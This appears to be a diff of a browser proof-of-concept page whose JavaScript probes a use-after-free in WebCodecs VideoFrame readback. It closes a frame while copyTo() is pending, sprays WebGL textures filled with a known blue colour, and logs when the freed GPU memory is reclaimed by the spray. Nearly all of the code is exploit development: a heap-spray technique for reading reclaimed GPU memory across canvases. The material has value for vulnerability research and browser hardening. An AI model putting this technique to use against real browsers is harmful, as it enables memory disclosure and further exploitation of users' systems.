@@ -7,79 +7,78 @@
 const log = s => { out.innerHTML += s + '<br>'; console.log(s); };
 
 async function main() {
-    log('WebCodecs Oilpan arena test v2');
+    log('GPU texture reclaim test');
     log('');
 
-    const sharedCanvas = new OffscreenCanvas(4, 4);
-    const sharedBitmap = await createImageBitmap(new ImageData(4,4));
+    const canvas = new OffscreenCanvas(64, 64);
+    const gl = canvas.getContext('webgl');
 
-    async function getBaseline() {
-        const canvas = new OffscreenCanvas(64, 64);
-        const gl = canvas.getContext('webgl');
+    // Baseline - pure red
+    gl.clearColor(1.0, 0.0, 0.0, 1.0);
+    gl.clear(gl.COLOR_BUFFER_BIT);
+    gl.finish();
+    const bf = new VideoFrame(canvas, {timestamp:0});
+    const bb = new Uint8Array(bf.allocationSize());
+    await bf.copyTo(bb); bf.close();
+    log('baseline: ' + Array.from(bb.slice(0,4)).map(x=>x.toString(16).padStart(2,'0')).join(' '));
+    log('');
+
+    // Create a pool of WebGL textures with known colors
+    // After VideoFrame close() releases its texture,
+    // one of our textures might get reused by the readback
+    const gl2 = (new OffscreenCanvas(64,64)).getContext('webgl');
+    
+    let hits = 0;
+    for (let a = 0; a < 50; a++) {
         gl.clearColor(1.0, 0.0, 0.0, 1.0);
         gl.clear(gl.COLOR_BUFFER_BIT);
         gl.finish();
-        const bf = new VideoFrame(canvas, {timestamp:0});
-        const bb = new Uint8Array(bf.allocationSize());
-        await bf.copyTo(bb);
-        bf.close();
-        return {canvas, gl, bb};
-    }
 
-    async function test(label, make, destroy) {
-        const {canvas, gl, bb} = await getBaseline();
-        const objs = [];
-        for (let i = 0; i < 2000; i++) {
-            try { objs.push(make(i)); } catch(e) {}
+        const f = new VideoFrame(canvas, {timestamp: a*1000});
+        const buf = new Uint8Array(f.allocationSize());
+        const p = f.copyTo(buf);
+        f.close();
+
+        // Spray WebGL textures with known blue color
+        const textures = [];
+        for (let j = 0; j < 100; j++) {
+            const tex = gl2.createTexture();
+            gl2.bindTexture(gl2.TEXTURE_2D, tex);
+            // Fill with blue pixels
+            const pixels = new Uint8Array(64*64*4).fill(0);
+            for (let k = 0; k < pixels.length; k+=4) {
+                pixels[k] = 0x00;   // R
+                pixels[k+1] = 0x00; // G
+                pixels[k+2] = 0xFF; // B
+                pixels[k+3] = 0xFF; // A
+            }
+            gl2.texImage2D(gl2.TEXTURE_2D, 0, gl2.RGBA, 64, 64, 0, gl2.RGBA, gl2.UNSIGNED_BYTE, pixels);
+            textures.push(tex);
         }
-        if (destroy) objs.forEach(o => { try { destroy(o); } catch(e){} });
-        objs.length = 0;
 
-        let hits = 0;
-        for (let a = 0; a < 30; a++) {
-            gl.clearColor(1,0,0,1); gl.clear(gl.COLOR_BUFFER_BIT); gl.finish();
-            const f = new VideoFrame(canvas, {timestamp: a*1000});
-            const buf = new Uint8Array(f.allocationSize());
-            const p = f.copyTo(buf);
-            f.close();
-            const s = [];
-            for (let j = 0; j < 30; j++) { try { s.push(make(j)); } catch(e){} }
-            await p;
-            if (destroy) s.forEach(o => { try { destroy(o); } catch(e){} });
-            s.length = 0;
-            if (buf.some((b,i) => b !== bb[i])) hits++;
-        }
-        log((hits > 0 ? '[HIT] ' : '[ -- ] ') + label + ': ' + hits + '/30');
-        return hits;
-    }
+        await p;
 
-    const fakeData = new Uint8Array(16).fill(0x41);
-    const audioData = new Float32Array(128);
+        // Clean up textures
+        textures.forEach(t => gl2.deleteTexture(t));
 
-    const tests = [
-        ['VideoFrame(sharedCanvas)', i => new VideoFrame(sharedCanvas, {timestamp:i}), f => f.close()],
-        ['VideoFrame(ImageBitmap)',  i => new VideoFrame(sharedBitmap, {timestamp:i}),  f => f.close()],
-        ['EncodedVideoChunk',        i => new EncodedVideoChunk({type:'key',timestamp:i,data:fakeData}), null],
-        ['EncodedAudioChunk',        i => new EncodedAudioChunk({type:'key',timestamp:i,data:fakeData}), null],
-        ['AudioData',                i => new AudioData({format:'f32',sampleRate:44100,numberOfFrames:128,numberOfChannels:1,timestamp:i,data:audioData}), a => a.close()],
-        ['VideoDecoder',             i => new VideoDecoder({output:f=>f.close(),error:()=>{}}), null],
-        ['AudioDecoder',             i => new AudioDecoder({output:a=>a.close(),error:()=>{}}), null],
-        ['VideoEncoder',             i => new VideoEncoder({output:()=>{},error:()=>{}}), null],
-    ];
-
-    for (const [label, make, destroy] of tests) {
-        try {
-            await test(label, make, destroy);
-        } catch(e) {
-            log('[ EE ] ' + label + ': ' + e.message);
+        const differs = buf.some((b,i) => b !== bb[i]);
+        if (differs) {
+            hits++;
+            log('[!] attempt ' + a + ' DIFFERS: ' + 
+                Array.from(buf.slice(0,4)).map(x=>x.toString(16).padStart(2,'0')).join(' '));
+            // Is it blue? (0x00 0x00 0xFF 0xFF in RGBA)
+            const hasBlue = buf[2] === 0xFF && buf[0] === 0x00;
+            if (hasBlue) log('    >>> BLUE TEXTURE RECLAIM CONFIRMED <<<');
         }
     }
 
     log('');
-    log('Done.');
+    log('hits: ' + hits + '/50');
+    if (hits > 0) log('GPU texture being reclaimed by our spray!');
+    else log('No GPU texture reclaim detected.');
 }
 
-main().catch(e => log('FATAL: ' + e));
+main().catch(e => log('ERR: ' + e));
 </script>
 </body>
 </html>
